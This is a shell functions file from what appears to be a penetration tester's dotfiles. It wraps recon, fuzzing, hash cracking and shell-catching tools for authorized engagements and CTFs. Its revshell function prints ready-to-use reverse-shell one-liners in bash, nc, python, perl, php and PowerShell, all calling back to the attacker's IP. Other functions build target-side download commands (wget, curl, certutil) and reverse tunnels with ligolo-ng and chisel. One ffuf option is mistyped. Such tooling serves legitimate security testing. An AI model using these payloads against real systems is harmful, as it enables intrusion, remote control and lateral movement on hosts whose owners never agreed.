# ~/dotfiles/shell/functions.sh — engagement workflow helpers
#
# For use on authorized engagements, CTFs, and lab work only. These are
# convenience wrappers around standard tooling — nothing here targets anything
# you don't point it at yourself.

# --- lhost: your attack IP (prefers VPN tun0, falls back to eth0) --------------
# Usage: lhost            -> prints and exports $LHOST
#        lhost eth0       -> force an interface
lhost() {
    local ifc="${1:-}"
    local ip=""
    if [ -n "$ifc" ]; then
        ip=$(ip -4 -o addr show "$ifc" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)
    else
        for ifc in tun0 tun1 eth0 wlan0; do
            ip=$(ip -4 -o addr show "$ifc" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)
            [ -n "$ip" ] && break
        done
    fi
    if [ -z "$ip" ]; then
        echo "lhost: no address found" >&2; return 1
    fi
    export LHOST="$ip"
    echo "$LHOST"
}

# --- target: set the box you're working and scaffold a working dir -------------
# Usage: target 10.10.11.42 [name]
#        target                 -> show current $RHOST / workdir
target() {
    if [ -z "$1" ]; then
        echo "RHOST=${RHOST:-<unset>}  name=${TARGET_NAME:-<unset>}  dir=${TARGET_DIR:-<unset>}"
        return 0
    fi
    export RHOST="$1"
    export TARGET_NAME="${2:-$1}"
    export TARGET_DIR="$OPS/$TARGET_NAME"
    mkdir -p "$TARGET_DIR"/{scans,loot,exploit,notes,www}
    [ -f "$TARGET_DIR/notes/README.md" ] || cat > "$TARGET_DIR/notes/README.md" <<EOF
# $TARGET_NAME ($RHOST)

- Started: $(date -Iseconds)
- LHOST: ${LHOST:-run \`lhost\`}

## Recon
## Foothold
## Privesc
## Loot
EOF
    cd "$TARGET_DIR" || return 1
    echo "target set: $TARGET_NAME ($RHOST) -> $TARGET_DIR"
}

# --- serve: HTTP file server in cwd, prints the reachable URL -------------------
# Usage: serve [port]   (default 8000)
serve() {
    local port="${1:-8000}"
    [ -n "$LHOST" ] || lhost >/dev/null
    echo "serving $(pwd) on http://${LHOST:-0.0.0.0}:${port}/"
    python3 -m http.server "$port"
}

# --- smbserve: quick anonymous SMB share (impacket) ----------------------------
# Usage: smbserve [share] [dir]   (default share=share, dir=cwd)
smbserve() {
    local share="${1:-share}" dir="${2:-$(pwd)}"
    [ -n "$LHOST" ] || lhost >/dev/null
    echo "SMB share //${LHOST}/${share} -> ${dir}  (Ctrl-C to stop)"
    impacket-smbserver -smb2support "$share" "$dir"
}

# --- listen: upgraded reverse-shell catcher ------------------------------------
# Prefers pwncat-cs, then rlwrap+nc, then plain nc. Usage: listen [port] (4444)
listen() {
    local port="${1:-4444}"
    if command -v pwncat-cs >/dev/null; then
        echo "[pwncat-cs] listening on :$port"
        pwncat-cs -l -p "$port"
    elif command -v rlwrap >/dev/null; then
        echo "[rlwrap nc] listening on :$port"
        rlwrap nc -lvnp "$port"
    else
        echo "[nc] listening on :$port  (install rlwrap/pwncat for a better shell)"
        nc -lvnp "$port"
    fi
}

# --- revshell: print common reverse-shell one-liners for the current LHOST -----
# Usage: revshell [port] [type]
#        type ∈ bash|python|nc|perl|php|powershell|all   (default all)
revshell() {
    local port="${1:-4444}" type="${2:-all}"
    [ -n "$LHOST" ] || lhost >/dev/null
    local ip="$LHOST"
    _rs_bash()   { echo "bash -i >& /dev/tcp/$ip/$port 0>&1"; }
    _rs_bash64() { local p; p=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$ip" "$port" | base64 -w0); echo "bash -c '{echo,$p}|{base64,-d}|bash'"; }
    _rs_nc()     { echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"; }
    _rs_python() { echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"; }
    _rs_perl()   { echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"; }
    _rs_php()    { echo "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; }
    _rs_ps()     { echo "powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$sb=([text.encoding]::ASCII).GetBytes(\$r+'PS '+(pwd).Path+'> ');\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()}\""; }
    echo "# LHOST=$ip PORT=$port"
    case "$type" in
        bash)       _rs_bash;;
        bash64)     _rs_bash64;;
        nc)         _rs_nc;;
        python)     _rs_python;;
        perl)       _rs_perl;;
        php)        _rs_php;;
        powershell|ps) _rs_ps;;
        all)
            printf '\n[bash]\n';        _rs_bash
            printf '\n[bash base64]\n'; _rs_bash64
            printf '\n[nc mkfifo]\n';   _rs_nc
            printf '\n[python pty]\n';  _rs_python
            printf '\n[perl]\n';        _rs_perl
            printf '\n[php]\n';         _rs_php
            printf '\n[powershell]\n';  _rs_ps
            printf '\n';;
        *) echo "unknown type: $type" >&2; return 1;;
    esac
}

# --- upgrade-shell: print the TTY-upgrade sequence to paste into a dumb shell ---
upgrade-shell() {
    cat <<'EOF'
# In the caught shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
# then background with Ctrl-Z, and locally:
stty raw -echo; fg
# back in the shell:
export TERM=xterm-256color; stty rows 50 cols 200
EOF
}

# --- scan: staged nmap into ./scans (fast top ports, then full on found ports) -
# Usage: scan [ip]   (defaults to $RHOST)
scan() {
    local ip="${1:-$RHOST}"
    [ -n "$ip" ] || { echo "scan: no target (set RHOST or pass an IP)" >&2; return 1; }
    local out="${TARGET_DIR:-.}/scans"; mkdir -p "$out"
    echo "[*] fast scan $ip ..."
    nmap -Pn -T4 --min-rate 1000 -p- -oN "$out/allports.nmap" "$ip"
    local p
    p=$(grep -oP '^\d+(?=/tcp\s+open)' "$out/allports.nmap" | paste -sd, -)
    [ -z "$p" ] && { echo "[!] no open TCP ports found"; return 0; }
    echo "[*] service/script scan on: $p"
    nmap -Pn -sCV -p"$p" -oN "$out/services.nmap" "$ip"
    echo "[+] results in $out/"
}

# --- fuzz: ffuf directory fuzz with a sane default wordlist ---------------------
# Usage: fuzz http://host/FUZZ [extra ffuf args...]
fuzz() {
    [ -n "$1" ] || { echo "fuzz: usage: fuzz http://host/FUZZ [args]" >&2; return 1; }
    local wl="$SECLISTS/Discovery/Web-Content/directory-list-2.3-medium.txt"
    [ -f "$wl" ] || wl="$WORDLISTS/dirb/common.txt"
    ffuf -u "$1" -w "$wl" - ic -c "${@:2}"
}

# --- b64 / ub64 / urlenc: quick encoders ---------------------------------------
b64()    { if [ -n "$1" ]; then printf '%s' "$1" | base64 -w0; echo; else base64 -w0; fi; }
ub64()   { if [ -n "$1" ]; then printf '%s' "$1" | base64 -d;  echo; else base64 -d; fi; }
urlenc() { python3 -c 'import sys,urllib.parse as u;print(u.quote(sys.argv[1] if len(sys.argv)>1 else sys.stdin.read().strip()))' "$@"; }

# --- dl: build a download one-liner for the current LHOST (paste on target) -----
# Usage: dl <file-in-cwd> [win]   -> prints wget/curl (or PowerShell) fetch cmd
dl() {
    [ -n "$1" ] || { echo "usage: dl <file> [win]"; return 1; }
    [ -n "$LHOST" ] || lhost >/dev/null
    local url="http://$LHOST:8000/$1"
    if [ "$2" = "win" ]; then
        echo "powershell -c \"iwr $url -OutFile C:\\Windows\\Temp\\$1\""
        echo "certutil -urlcache -f $url $1"
    else
        echo "wget $url -O /tmp/$1  ||  curl -s $url -o /tmp/$1"
    fi
    echo "# (serve first: run \`serve\` in the dir holding $1)"
}

# --- tunnel: quick tunneling recipes (ligolo-ng / chisel) ----------------------
# Prints the exact commands for whichever tool you have; no magic, just recall.
tunnel() {
    [ -n "$LHOST" ] || lhost >/dev/null
    cat <<EOF
# ── ligolo-ng ──────────────────────────────────────────────
# attacker: set up the interface once
sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                                   # start proxy (:11601)
# on target: connect back
./agent -connect $LHOST:11601 -ignore-cert
# attacker (in ligolo session): session; then add route to the pivot subnet
sudo ip route add <SUBNET>/24 dev ligolo

# ── chisel (reverse SOCKS) ─────────────────────────────────
./chisel server -p 8080 --reverse                   # attacker
./chisel client $LHOST:8080 R:1080:socks            # target
# then: proxychains <tool>   (socks5 127.0.0.1 1080 in /etc/proxychains4.conf)
EOF
}

# --- crack: pick the hashcat mode by name, run against rockyou ------------------
# Usage: crack <hashfile> <mode>   mode ∈ ntlm|asrep|kerb|net-ntlmv2|sha512crypt
crack() {
    local f="$1" name="$2"
    [ -n "$f" ] && [ -n "$name" ] || { echo "usage: crack <hashfile> <ntlm|asrep|kerb|net-ntlmv2|sha512crypt>"; return 1; }
    local m
    case "$name" in
        ntlm)         m=1000;;
        asrep)        m=18200;;
        kerb)         m=13100;;
        net-ntlmv2)   m=5600;;
        sha512crypt)  m=1800;;
        *) echo "unknown: $name"; return 1;;
    esac
    local wl="$WORDLISTS/rockyou.txt"; [ -f "$wl" ] || wl="$WORDLISTS/rockyou.txt.gz"
    hashcat -m "$m" "$f" "$wl"
}

# --- mythic: drive mythic-cli from anywhere ------------------------------------
# Usage: mythic <start|stop|status|...>   (wraps sudo ./mythic-cli in $MYTHIC_DIR)
#        mythic creds   -> print the admin login
mythic() {
    local dir="${MYTHIC_DIR:-$HOME/opt/Mythic}"
    [ -x "$dir/mythic-cli" ] || { echo "mythic-cli not built — run: $RT_DOTFILES/tools/mythic-setup.sh"; return 1; }
    if [ "$1" = "creds" ]; then
        echo "url:  https://127.0.0.1:7443"
        echo "user: mythic_admin"
        local p; p=$(sudo grep -E '^MYTHIC_ADMIN_PASSWORD=' "$dir/.env" 2>/dev/null | cut -d= -f2-)
        if [ -n "$p" ]; then echo "pass: $p"; else echo "pass: (not in .env — retrieve from your password manager)"; fi
        return
    fi
    ( cd "$dir" && sudo ./mythic-cli "$@" )
}

# --- cht: open a repo cheatsheet in the pager ----------------------------------
cht() {
    local d="$RT_DOTFILES/cheatsheets"
    if [ -z "$1" ]; then ls "$d" 2>/dev/null | sed 's/\.md$//'; return; fi
    local f="$d/$1.md"; [ -f "$f" ] || f=$(ls "$d/$1"* 2>/dev/null | head -1)
    [ -f "$f" ] && { command -v batcat >/dev/null && batcat "$f" || ${PAGER:-less} "$f"; } || echo "no cheatsheet: $1"
}

# --- note: append a timestamped line to the current target's notes -------------
note() {
    local f="${TARGET_DIR:-.}/notes/README.md"
    [ -d "$(dirname "$f")" ] || f="./notes.md"
    printf -- '- `%s` %s\n' "$(date +%H:%M)" "$*" >> "$f"
    echo "-> $f"
}
